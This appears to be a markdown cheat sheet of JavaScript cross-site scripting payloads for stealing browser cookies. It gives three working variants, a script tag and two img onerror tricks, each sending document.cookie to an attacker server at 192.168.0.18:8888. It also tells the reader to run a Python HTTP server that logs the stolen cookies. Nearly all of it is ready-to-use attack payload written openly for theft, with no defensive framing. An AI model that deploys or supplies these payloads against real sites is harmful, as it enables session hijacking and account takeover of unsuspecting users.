# JavaScript

## Cookie Stealing
(Note: `HttpOnly` should not be enabled/present in cookie header)

* **Classic way**
```javascript
<script>var i=new Image;i.src="http://192.168.0.18:8888/?"+document.cookie;</script>

```
* **<img> Tag and Without the Infinite Loop**

This one works and will only steal the cookie once.
```javascript
<img src=x onerror="this.src='http://192.168.0.18:8888/?'+document.cookie; this.removeAttribute('onerror');">

```
* **<img> Tag Instead of <script> Tags**
Don't use this one! It works but calls `onerror()` in a loop, filling up your stolen cookie log.
```javascript
<img src=x onerror=this.src='http://192.168.0.18:8888/?'+document.cookie;>

```

## Run the Cookie Stealer Python Script
You'll need a place to capture the stolen cookies. [lnxg33k](https://github.com/lnxg33k) has written an excellent Python script called [XSS-cookie-stealer.py](). Run it with Python 2.6 or higher. It is just an HTTP server which logs each inbound HTTP connection and all the cookies contained in that connection.
```bash
# Run script
python XSS-cookie-stealer.py

# The resulting output, at minimum, will be this
Started http server


```









